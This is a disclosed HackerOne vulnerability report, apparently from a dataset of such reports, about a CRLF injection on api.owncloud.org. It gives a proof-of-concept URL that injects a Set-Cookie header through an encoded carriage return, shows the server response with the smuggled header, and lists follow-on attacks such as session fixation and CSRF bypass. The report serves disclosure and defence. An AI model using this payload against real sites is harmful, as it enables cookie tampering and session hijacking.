---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '154306'
original_report_id: '154306'
title: '[api.owncloud.org] CRLF Injection'
team_handle: owncloud
created_at: '2016-07-27T10:29:30.485Z'
disclosed_at: '2016-11-02T13:38:48.259Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
---

# [api.owncloud.org] CRLF Injection

## Metadata

- HackerOne Report ID: 154306
- Weakness: 
- Program: owncloud
- Disclosed At: 2016-11-02T13:38:48.259Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

**PoC**:
`https://api.owncloud.org/%23%0dSet-Cookie:crlf=injection2;domain=.owncloud.org;`

**HTTP Response**:
```
HTTP/1.1 301 Moved Permanently\r\n
Date: Wed, 27 Jul 2016 10:28:01 GMT\r\n
Server: Apache\r\n
Strict-Transport-Security: max-age=63072000\r\n
X-Xss-Protection: 1; mode=block\r\n
Location: https://doc.owncloud.org/api/#\r                       < injection \r
Set-Cookie:crlf=injection;domain=.owncloud.org;\r\n
```

**Result**:
Creating a cookie-param "crlf=injection" on *.owncloud.org

This vulnerability could be used in combination with others. For example, XSS via Cookie, bypass Double Submit Cookie csrf protection or session fixation. HTTP headers delimiter \r (%0d) is supported by any web browser other than FireFox.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
